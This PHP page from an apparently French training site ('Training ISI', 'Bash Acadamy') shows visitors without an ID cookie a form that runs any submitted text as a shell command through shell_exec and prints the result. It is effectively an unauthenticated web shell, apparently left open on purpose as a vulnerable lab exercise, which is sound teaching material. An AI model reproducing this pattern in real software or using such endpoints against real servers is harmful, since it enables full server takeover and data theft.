<!DOCTYPE HTML>
<html>

<head>
  <title>Training ISI</title>
  <meta name="description" content="website description" />
  <meta name="keywords" content="website keywords, website keywords" />
  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
  <link rel="stylesheet" type="text/css" href="style/style.css" />
</head>

<body>
  <div id="main">
    <div id="header">
      <div id="logo">
        <div id="logo_text">
          <!-- class="logo_colour", allows you to change the colour of the text -->
          <h1><a href="index.php">Training<span class="logo_colour">ISI</span></a></h1>
        </div>
      </div>
      <div id="menubar">
        <ul id="menu">
          <!-- put class="selected" in the li tag for the selected page - to highlight which page you're on -->
          <li><a href="index.php">Home</a></li>
          <li><a href="categorie.php">Catégories</a></li>
          <li><a href="upload.php">Upload</a></li>
          <li><a href="contacts.php">Contact</a></li>
	  <li  class="selected"><a href="connexion.php">Connexion</a></li>
        </ul>
      </div>
    </div>
    <div id="content_header"></div>
    <div id="site_content">
      <div id="sidebar_container">
        <div class="sidebar">
          <div class="sidebar_top"></div>
          <div class="sidebar_item">
            <!-- insert your sidebar items here -->
            <?php include('./includes/repositories.inc.php'); ?>
			</div>
          <div class="sidebar_base"></div>
        </div>
        <div class="sidebar">
          <div class="sidebar_top"></div>
          <div class="sidebar_item">
            <?php include('./includes/last_categories.inc.php'); ?>
          </div>
          <div class="sidebar_base"></div>
        </div>
        <div class="sidebar">
          <div class="sidebar_top"></div>
		  <div class="sidebar_item">
            <?php include('./includes/news.inc.php'); ?>
          </div>
          <div class="sidebar_base"></div>
        </div>
      </div>
      <div id="content">
        <h1>Bash Acadamy</h1>
	<hr/>
	
	<br/>
		
<?php         
	     if(!isset($_COOKIE['ID']) || empty($_COOKIE['ID'])){
		echo '<form action="#" method="POST" >
                <div>
                    Commande:<br/>
                    <input type="text" name="cmd" value="" />
                </div><br/>
       		 </form><br/><br/>';
              if (isset($_POST['cmd']) && !empty($_POST['cmd'])) {

              	$cmd = $_POST["cmd"];
		$output = shell_exec($cmd);
		echo "<pre>$output</pre>";

               }
	      }
?>
        </div>
        </div>
        </div>
    <?php include('./includes/footer.inc.php'); ?>
</div>
</body>
</html>
